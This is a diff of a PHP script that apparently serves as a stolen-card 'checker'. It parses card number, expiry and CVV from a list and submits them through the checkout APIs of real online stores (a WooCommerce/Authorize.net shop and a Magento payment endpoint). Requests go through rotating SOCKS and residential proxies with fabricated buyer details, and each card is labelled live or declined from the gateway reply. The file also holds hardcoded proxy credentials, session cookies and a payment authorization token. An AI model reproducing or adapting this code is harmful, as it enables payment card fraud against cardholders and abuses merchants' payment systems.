@@ -23,14 +23,6 @@ $cc = $separar[0];
 $mes = $separar[1];
 $ano = $separar[2];
 $cvv = $separar[3];
-$binn = substr($cc,0,6);
-
-
-if(strlen($mes<='09')){
-        $mes1=substr($mes,1,2);
-    } else {
-        $mes1=$mes;
-    }
 $cc1 = substr($cc,0,4);
 $cc2 = substr($cc,4,4);
 $cc3 = substr($cc,8,4);
@@ -38,6 +30,8 @@ $cc4 = substr($cc,12,4);
 $cc5 = substr($cc,0,4);
 $cc6 = substr($cc,4,6);
 $cc7 = substr($cc,10,5);
+$binn = substr($cc,0,6);
+
 
 
 if($cbin == "3"){
@@ -46,9 +40,16 @@ if($cbin == "3"){
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
 
+
+if(strlen($mes<='09')){
+        $mes1=substr($mes,1,2);
+    } else {
+        $mes1=$mes;
+    }
+
 If(strlen($ano) > 2)
 {
-  $ano1 = substr($ano,2,2);
+  $ano = substr($ano,2,2);
 }
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
@@ -104,180 +105,102 @@ function datosapellido(){
 
 
 function email($nombre){
-  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
+  $email = preg_replace('<\W+>', "", $apellido).rand(0000,9999)."@hotmail.com";
   return $email;
 }
+ function ibuuproxy(){
+  $proxySocks = file("Socks5.txt");
+   $myproxy = rand(0, sizeof($proxySocks)-1);
+   $proxySocks = $proxySocks[$myproxy];
+ return $proxySocks;
+}
+
 
 ///$cpf = cpf(1);
 $nombre = datosnombre();
 $apellido = datosapellido();
-// $email = email($nombre);
+$email = email($apellido);
 $zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
-$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
-$username = 'lum-customer-hl_6366aa06-zone-static_res';
-$password = 'a9by3kql965v';
+$username = 'lum-customer-hl_7873c611-zone-static_res';
+$password = 'p8txkzc6mq9h';
 $port = 22225;
 $session = mt_rand();
 $super_proxy = 'zproxy.lum-superproxy.io';
-
 $ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
 $city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);
 
-function ibuuproxy(){
-  $poxySocks = file("Socks5.txt");
-   $myproxy = rand(0, sizeof($poxySocks)-1);
-   $poxySocks = $poxySocks[$myproxy];
- return $poxySocks;
-}
 
-$poxySocks5 = ibuuproxy();
-
-$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
-$lname = 'Wang';
-$email1 = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
- // $email2 = $fname.rand(10,999).'@yopmail.com';
-// //$password = 'P@5%Word';
-// $password2 = 'Hansabhen1@';
-$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
-$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
-
-$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
+// echo $binn;
 
 
 
+$auth = substr(str_shuffle(str_repeat("ABCDEFGHIJabcdefghijklmopqrstuvxyz", 12)), 0, 12);
 
 
+#req1==============================================================================
+
+// #==========================================================================================================
 
 
-
-// curl_close($ch);
-
-
-
-// $ch = curl_init();
-// curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/2kb2g96kj2gdxjz3/client_api/v1/payment_methods/credit_cards');
-// curl_setopt($ch, CURLOPT_HEADER, 0);
-// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-//    curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-//    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
-// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-// 'Accept: */*',
-// 'Accept-Encoding: gzip, deflate, br',
-// 'Accept-Language: en-US,en;q=0.9',
-// 'Content-Type: application/json',
-// 'Host: api.braintreegateway.com',
-// 'Origin: https://assets.braintreegateway.com',
-// 'Referer: https://assets.braintreegateway.com/web/3.19.0/html/hosted-fields-frame.min.html',
-// 'user-agent: '.$browser.''
-// ));
-
-// curl_setopt($ch, CURLOPT_POSTFIELDS, '{"_meta":{"merchantAppId":"www.videezy.com","platform":"web","sdkVersion":"3.19.0","source":"hosted-fields","integration":"custom","integrationType":"custom","sessionId":"04c75dbc-508b-44d6-83f1-43573d618b9f"},"creditCard":{"number":"'.$cc.'","cvv":"'.$cvv.'","expiration_month":"'.$mes.'","expiration_year":"'.$ano.'","cardholderName":"Megha SHyam","options":{"validate":false}},"braintreeLibraryVersion":"braintree/web/3.19.0","authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTIyNDM1MDEsImp0aSI6IjZkMDYwZjIyLTgzNmYtNDJhNC05ZWU4LWVjMDE2MzY0MTY3NSIsInN1YiI6IjJrYjJnOTZrajJnZHhqejMiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjJrYjJnOTZrajJnZHhqejMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7fX0.zgsA8hTclhmFpQTpmI6HzU52UVx35Cr1Lf0jE_aO1cBvDPow8R8GqCw52cXskGM19VZNUbCjhVYP5ntvxzcpgw"}');
-
-
-// $b_pago = curl_exec($ch);
-
-// $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
-//  $country = trim(strip_tags(getstr($b_pago,'"issuingCountry":"','"')));
-//  $bank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
-//  $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
-//  $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
-//  $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));
-
-
-  // echo $b_pago;
-
-// echo $token;
-
-// echo $ccnum;
-// echo $mes1;
-// echo $ano;
-// echo $cvv;
-
-// // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://scarmd.net/?wc-ajax=checkout');
-
-//////////////////////// PROXY CALLS ////////////////////////////
-//               REMOVE '//' FOR PROXIES TO WORK BELOW
-
-//////////////////////// PROXYSCRAPE
-// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-//////////////////////// WEBSHARE
-// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");
-
-//////////////////////// MANUAL Proxy List
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST
-
-//////////////////////// LUMINATI
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// End Proxy Calls
+curl_setopt($ch, CURLOPT_URL, 'https://www.schots.com.au/rest/default/V1/guest-carts/in0mrJy9oi3u4vUbWB9rTKvqMTdyaEm9/payment-information');
 curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+ // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+ // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+//  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
+curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json, text/javascript, */*; q=0.01',
+'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=fe0c2951a807cd95a195d04108bfffe0; woocommerce_items_in_cart=1; wp_woocommerce_session_442495aa9cdcf351345a7f4758563058=96b45e5bb6f8d97e1cc688313ea03dfc%7C%7C1592539440%7C%7C1592535840%7C%7C0ab8a47ea98a0116bf1c757be2dbcb03; woocommerce_cart_hash=5298f7e3f5362da3e6ddc90f036f2f4f',
-'origin: https://scarmd.net',
-'referer: https://scarmd.net/checkout/',
+'content-type: application/json',
+'cookie: __cfduid=d5fd7816db0595ea6db5c36acea79eb311592325271; PHPSESSID=1f466e93f1b8d1811cfe9b79903fb2e8; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; __zlcmid=yjjDNQvv7TXpfG; mage-cache-sessid=true; mage-banners-cache-storage=%7B%7D; form_key=EvrmUBXse65QyIQE; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; privateData=%7B%22search%22%3A%22tape%22%7D; private_content_version=628abdd1722f48725f7c3974f8426f88; section_data_ids=%7B%22cart%22%3A1592330150%2C%22customer%22%3A1592330150%2C%22compare-products%22%3A1592330150%2C%22last-ordered-items%22%3A1592330150%2C%22directory-data%22%3A1592330150%2C%22captcha%22%3A1592330150%2C%22wishlist%22%3A1592330150%2C%22instant-purchase%22%3A1592330150%2C%22multiplewishlist%22%3A1592330150%2C%22persistent%22%3A1592330150%2C%22review%22%3A1592330150%2C%22zopim-chat%22%3A1592330150%2C%22recently_viewed_product%22%3A1592330150%2C%22recently_compared_product%22%3A1592330150%2C%22product_data_storage%22%3A1592330150%2C%22paypal-billing-agreement%22%3A1592330150%2C%22checkout-fields%22%3A1592330150%2C%22collection-point-result%22%3A1592330150%2C%22pickup-location-result%22%3A1592330150%7D
+',
+'origin: https://www.schots.com.au',
+'referer: https://www.schots.com.au/checkout/',
 'user-agent: '.$browser.''
 ));
 
-//////////////////////// START POST FILED 1 ////////////////////////
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"in0mrJy9oi3u4vUbWB9rTKvqMTdyaEm9","billingAddress":{"countryId":"AU","regionId":"513","regionCode":"NSW","region":"New South Wales","street":["12 Avenue Road"],"company":"","telephone":"424152448","postcode":"2037","city":"GLEBE","firstname":"Vincnet","lastname":"Warner","saveInAddressBook":0,"save_in_address_book":0,"extension_attributes":{"is_stairs":0}},"paymentMethod":{"method":"migs","additional_data":{"cc_cid":"'.$cvv.'","cc_ss_start_month":"","cc_ss_start_year":"","cc_ss_issue":"","cc_type":"VI","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes1.'","cc_number":"'.$cc.'"}},"email":"pubgkittu@gmail.com"}');
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincnet&billing_last_name=Warner&billing_company=&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_phone=5182641524&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=FL&shipping_postcode=&order_comments=&shipping_method%5B0%5D=legacy_flat_rate&payment_method=authnet&authnet-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&authnet-card-expiry='.$mes.'+%2F+'.$ano1.'&authnet-card-cvc='.$cvv.'&_wpnonce=d82c47500d&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
-
-// // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
 
 $result = curl_exec($ch);
-if (curl_errno($ch)) {
-    echo 'Error:'.curl_error($ch);
-}
-curl_close($ch);
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\">\n\t\t\t<li>','<\/li>\n\t<\/ul>\n"')));
-// $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
-// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
 
 
-// // // /////////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'"result":"success"')){
+ $message = trim(strip_tags(getstr($result,'"message":"Gateway Error: Declined"')));
+// // // // $code = trim(strip_tags(getstr($result,'"errorClass":"','"')));
+
+// // // // // // // // // //  // $message3 = trim(strip_tags(getstr($result,'"status": "','"')));
+
+// // // // // // // // // //  // $message4 = trim(strip_tags(getstr($result,'"errors": {"_all": ["','"]}')));
+
+
+//  if(strpos($result,'"result":"success"')){
+//     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+//    }
+// // elseif(strpos($result,'Payment failed: Declined')){
+  // echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ NOT SURE BUT MUST BE LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+//   }
+// else {
+
+       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
+
 // updatecart();
-      echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-    }
-elseif(strpos($result,'Not Acceptable!')) {
+// }
 
-            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-
-  }
-
-else {
-              echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-  }
-curl_close($curl);
+curl_close($ch);
 ob_flush();
-     // echo $result;
-//echo $browser;
+   echo $result;
+ // echo $c_pago;
 ?>
